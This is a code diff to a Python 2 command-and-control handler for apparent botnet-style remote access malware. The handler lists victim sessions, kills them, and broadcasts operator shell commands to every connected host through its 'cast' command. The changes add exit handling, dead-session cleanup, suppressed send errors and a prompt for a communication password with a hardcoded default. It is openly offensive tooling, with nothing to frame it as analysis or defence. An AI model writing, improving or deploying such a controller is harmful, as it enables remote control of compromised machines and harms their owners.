@@ -42,7 +42,7 @@ class listener:
     def C2(self):
         while True:
                 try:
-                    command_list = ["session","sessions","kill","help","cast","killall"]
+                    command_list = ["session","sessions","kill","help","cast","killall","exit"]
                     command = raw_input("\033[1;32;33m[ CNC ] >>> \x1b[0m")
                     command = command.split(" ")
                     if command[0] == "sessions":
@@ -51,8 +51,8 @@ class listener:
  Sessions
  ========
  
- ID             address         connection time
- --     --------------------    ---------------
+ ID             address                 connection time
+ --     --------------------            ---------------
 """
                         for ip in self.ips:
                             print " ", "".join(str(count)) + "\t" + str(ip[0]) + ":" + str(ip[1]) + "\t\t", self.connection_time[count]
@@ -71,22 +71,28 @@ class listener:
                         except KeyboardInterrupt:
                             print "\n\033[1;32;34m\n[+]\x1b[0m Session sent to background \033[1;32;34m[+]\x1b[0m\n"
                             pass
-                        except:
-                            print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID \033[1;32;31m [!]\n\x1b[0m"
-                            pass
+                        except Exception,e:
+                            if "Broken pipe" in e:
+                                self.targets.remove(self.targets[num])
+                                self.ips.remove(self.ips[num])
+                                self.id -= 1
+                                self.clients -= 1
+                                print red,"\n[!] Session is not responding, this ID will be removed [!]\n",r
+                                print "\033[1;32;33m\n[+]\x1b[0m Session ID ", str(num), " removed \033[1;32;33m[+]\x1b[0m\n"
+                            else:
+                                print "\n\033[1;32;31m [!]\x1b[0m Invalid session ID\033[1;32;31m [!]\n\x1b[0m"
+
 
                     elif command[0] == "help":
                         print c2help
 
-                    elif command[0] == "exit":
-                        sock.close()
 
                     # run the given command on all connected sessions and return the results........................................................................
                     elif command[0] == "cast":
                         if not command[1]:
                             print  "\n\033[1;32;31m [!]\x1b[0m usage: cast [command] \033[1;32;31m [!]\n\x1b[0m"
                         else:
-                            number_of_targets = len(self.targets)
+                            number_of_targets= len(self.targets)
                             i = 0
                             try:
                                 while i < number_of_targets:
@@ -96,8 +102,11 @@ class listener:
 
                                     print "\033[1;32;32m \n[+]\x1b[0m Response from session ",target_session ," ,",str(target_address[0]),":",str(target_address[1]),"\033[1;32;32m [+]\x1b[0m"
                                     print  green,"=============================================================================",r
-                                    self.json_send(command[1:],target_number)
-                                    print self.receive(target_number) + "\n\n"
+                                    try:
+                                        self.json_send(command[1:],target_number)
+                                        print self.receive(target_number) + "\n\n"
+                                    except :
+                                        pass
                                     i += 1
                             except Exception,e:
                                 print e
@@ -106,7 +115,10 @@ class listener:
                     elif command[0] == "kill":
                         try:
                             counter = int(command[1])
-                            self.json_send("terminate", self.targets[counter])
+                            try:
+                                self.json_send("terminate", self.targets[counter])
+                            except:
+                                pass
                             self.targets.remove(self.targets[counter])
                             self.ips.remove(self.ips[counter])
                             self.id -= 1
@@ -122,7 +134,10 @@ class listener:
                         try:
                             while i < number_of_targets:
                                 try:
-                                    self.json_send("terminate", self.targets[0])
+                                    try:
+                                        self.json_send("terminate", self.targets[0])
+                                    except:
+                                        pass
                                     self.targets.remove(self.targets[0])
                                     self.ips.remove(self.ips[0])
                                     self.id -= 1
@@ -149,11 +164,23 @@ class listener:
                         except Exception,e:
                             print "\n\033[1;32;31m [!]\x1b[0m Error occured while running local command \033[1;32;31m [!]\n\x1b[0m"
                             print e
+
+                    elif "exit" in command:
+                        exit_check = raw_input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
+                        if exit_check == 'y':
+                            print red, "\n [!] CNC terminated... [!]\n", r
+                            os._exit(os.EX_OK)
+                        elif exit_check == 'n':
+                            break
+                        else:
+                            print red, "\n[!] wrong input [!]\n", r
+                            continue
+
                 except KeyboardInterrupt:
                     while True:
                         exit_check = raw_input("\n\033[0;31m[>] Exit the CNC ? (y/n): \033[0m")
                         if exit_check == 'y':
-                            print red, "\n [!] CNC aborted... [!]\n", r
+                            print red, "\n [!] CNC terminated... [!]\n", r
                             os._exit(os.EX_OK)
                         elif exit_check == 'n':
                             break
@@ -490,6 +517,9 @@ if __name__ == '__main__':
         if port == "":
             port = 6000
         port = int(port)
+        password = raw_input("\033[1;32;34m[>]\x1b[0m Communication password (default:'djknBDS89dHFS(*HFSD())') >>>")
+        if password == "":
+            password = 'djknBDS89dHFS(*HFSD())'
         print cyan, "\n Handler started on ", ip, ":", port, "...\n\n", r
         starter = listener(ip, port)
         starter.run()
